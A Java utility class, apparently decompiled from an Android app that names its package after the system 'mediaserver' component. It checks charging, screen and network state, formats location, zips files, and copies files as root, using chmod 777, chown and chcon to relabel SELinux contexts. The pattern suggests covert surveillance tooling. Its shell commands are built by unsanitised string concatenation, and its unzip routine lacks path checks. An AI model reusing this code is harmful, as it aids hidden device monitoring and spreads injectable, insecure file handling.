package com.android.mediaserver.util;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.PowerManager;
import android.os.Process;
import com.android.mediaserver.AppConstants;
import com.android.mediaserver.shell.Shell.SH;
import com.android.mediaserver.shell.Shell.SU;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.DecimalFormat;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

public class AppUtils {
  private static final int BUFFER_SIZE = 2097152;

  public static boolean isConnectedToInternet(Context context) {
    NetworkInfo activeNetwork =
        ((ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
    return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
  }

  public static boolean isConnectedToCharger(Context context) {
    int plugged =
        context.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"))
            .getIntExtra("plugged", -1);
    if (plugged == 1 || plugged == 2) {
      return true;
    }
    return false;
  }

  public static double getBatteryLevel(Context context) {
    Intent batteryIntent =
        context.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
    int level = batteryIntent.getIntExtra("level", -1);
    int scale = batteryIntent.getIntExtra("scale", -1);
    if (level == -1 || scale == -1) {
      return -1.0d;
    }
    return ((double) (((float) level) / ((float) scale))) * 100.0d;
  }

  public static boolean isScreenOn(Context context) {
    PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
    if (powerManager == null || powerManager.isScreenOn()) {
      return true;
    }
    return false;
  }

  public static String locationStringFromLocation(Location location) {
    return Location.convert(location.getLatitude(), 0) + " " + Location.convert(
        location.getLongitude(), 0);
  }

  public static boolean copyFileToFilesDirNoRoot(String srcPath, String dstPath) {
    List<String> res = SH.run("cat " + srcPath + " > " + dstPath);
    if (res == null || res.size() != 0) {
      return false;
    }
    SH.run("chmod 755 " + dstPath);
    return true;
  }

  public static boolean copyFileToFilesDir(Context context, String srcPath, String dstPath) {
    List<String> res = SU.run("cat " + srcPath + " > " + dstPath);
    if (res == null || res.size() != 0) {
      return false;
    }
    String chmodCmd = "chmod 777 " + dstPath;
    String chownCmd = "chown " + Process.myUid() + ":" + Process.myUid() + " " + dstPath;
    String chconCmd = "chcon " + getInternalSELinuxFileContext(context) + " " + dstPath;
    SU.run(chmodCmd);
    SU.run(chownCmd);
    SU.run(chconCmd);
    return true;
  }

  public static boolean zipFiles(String[] files, String zipFile) {
    try {
      ZipOutputStream out =
          new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(zipFile)));
      byte[] data = new byte[1048576];
      for (int i = 0; i < files.length; i++) {
        BufferedInputStream origin =
            new BufferedInputStream(new FileInputStream(files[i]), 1048576);
        out.putNextEntry(new ZipEntry(files[i].substring(files[i].lastIndexOf("/") + 1)));
        while (true) {
          int count = origin.read(data, 0, 1048576);
          if (count == -1) {
            break;
          }
          out.write(data, 0, count);
        }
        origin.close();
      }
      out.close();
      return true;
    } catch (Exception e) {
      return false;
    }
  }

  public static void extractAsset(Context ctx, String name, String destination, boolean overwrite)
      throws IOException {
    try {
      File f = new File(destination);
      if (f.exists() && overwrite) {
        f.delete();
      }
    } catch (Exception e) {
    }
    copy(ctx.getAssets().open(name), new FileOutputStream(destination));
  }

  public static void copy(InputStream input, OutputStream output) throws IOException {
    try {
      byte[] buffer = new byte[2097152];
      int bytesRead = input.read(buffer);
      while (bytesRead != -1) {
        output.write(buffer, 0, bytesRead);
        bytesRead = input.read(buffer);
      }
    } finally {
      input.close();
      output.close();
    }
  }

  public static void setUsedFiles(Context context, String fileName) {
    context.getSharedPreferences(AppConstants.PREFERENCES_NAME, 0)
        .edit()
        .putString(AppConstants.USED_FILES_KEY, fileName)
        .commit();
  }

  public static String getUsedFile(Context context) {
    return context.getSharedPreferences(AppConstants.PREFERENCES_NAME, 0)
        .getString(AppConstants.USED_FILES_KEY, "");
  }

  public static String readableFileSize(long size) {
    if (size <= 0) {
      return "0";
    }
    int digitGroups = (int) (Math.log10((double) size) / Math.log10(1024.0d));
    return new DecimalFormat("#,##0.#").format(
        ((double) size) / Math.pow(1024.0d, (double) digitGroups)) + " " + new String[] {
        "B", "KB", "MB", "GB", "TB"
    }[digitGroups];
  }

  public static String getSELinuxContextFilePath(Context context) {
    return context.getFilesDir().getAbsolutePath() + File.separator + "secontext";
  }

  public static String getFileSELinuxContext(String path) {
    List<String> output = SH.run("ls -lZ " + path);
    if (1 != output.size()) {
      return "";
    }
    return ((String) output.get(0)).split("\\s+")[3].trim();
  }

  public static String getInternalSELinuxFileContext(Context context) {
    return getFileSELinuxContext(getSELinuxContextFilePath(context));
  }

  public static void unzip(File zipFile, File targetDirectory) throws IOException {
    FileOutputStream fout;
    ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zipFile)));
    try {
      byte[] buffer = new byte[8192];
      while (true) {
        ZipEntry ze = zis.getNextEntry();
        if (ze != null) {
          File file = new File(targetDirectory, ze.getName());
          File dir = ze.isDirectory() ? file : file.getParentFile();
          if (!dir.isDirectory() && !dir.mkdirs()) {
            throw new FileNotFoundException("Failed to ensure directory: " + dir.getAbsolutePath());
          } else if (!ze.isDirectory()) {
            fout = new FileOutputStream(file);
            while (true) {
              int count = zis.read(buffer);
              if (count == -1) {
                break;
              }
              fout.write(buffer, 0, count);
            }
            fout.close();
          }
        } else {
          zis.close();
          return;
        }
      }
    } catch (Throwable th) {
      zis.close();
    }
  }
}
